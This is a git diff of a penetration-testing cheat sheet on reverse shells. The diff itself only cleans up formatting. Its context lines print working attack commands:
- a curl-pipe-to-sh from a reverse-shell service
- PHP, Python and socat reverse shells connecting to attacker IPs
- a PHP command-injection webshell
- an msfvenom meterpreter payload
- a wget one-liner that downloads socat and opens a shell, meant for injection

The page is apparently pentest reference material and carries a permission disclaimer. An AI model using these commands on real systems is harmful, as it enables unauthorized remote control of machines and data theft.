@@ -3,19 +3,20 @@
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
-TODO: description, methodology, and script prep for each section (issue [#15](https://github.com/zweilosec/Infosec-Notes/issues/15))
+TODO: description, methodology, and script prep for each section \(issue [\#15](https://github.com/zweilosec/Infosec-Notes/issues/15)\)
+
 * Add description and methodology as needed for each section
-* Prep all code examples for scripting (replace IPs and ports with variables, etc.)
+* Prep all code examples for scripting \(replace IPs and ports with variables, etc.\)
 * Ensure code examples' variables are appropriate for their respective programming language
 
 ## Reverse Shells
 
 ### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)
 
-[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)  
+[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)
 
 ```bash
 curl https://shell.now.sh/<ip>:<port> | sh
@@ -59,7 +60,7 @@ php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
 
-### PHP command injection webshell: 
+### PHP command injection webshell:
 
 ```php
 <?php system($_GET['variable_name']); ?>
@@ -167,7 +168,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f el
 
 ### Upgrade to fully interactive shell \(python example\):
 
-After catching a shell through netcat, you are placed in a shell that has very limited functionality.  If the remote machine has python or python3 installed you can easily upgrade to a fully functional shell.
+After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional shell.
 
 ```bash
 #On victim machine
@@ -208,7 +209,7 @@ interact
 
 ### **Using socat**
 
-Another option is to upload the binary for `socat` to the victim machine and magically get a fully interactive shell. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).  Socat needs to be on both machines for this to work.
+Another option is to upload the binary for `socat` to the victim machine and magically get a fully interactive shell. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries). Socat needs to be on both machines for this to work.
 
 ```bash
 #Listener:
@@ -220,7 +221,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 
 #### socat one-liner
 
-This one-liner can be injected wherever you can get command injection for an instant reverse shell.  Point the path to the binary to your local http server if internet access is limited on the victim.  
+This one-liner can be injected wherever you can get command injection for an instant reverse shell. Point the path to the binary to your local http server if internet access is limited on the victim.
 
 ```bash
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
@@ -265,7 +266,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 #### PHP
 
-This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
+This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…
 
 ```php
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -303,13 +304,13 @@ p.waitFor()
 
 #### xterm
 
-One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
 
 ```text
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\).  One way to do this is with Xnest \(to be run on your system\):
+To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest \(to be run on your system\):
 
 ```text
 Xnest :1
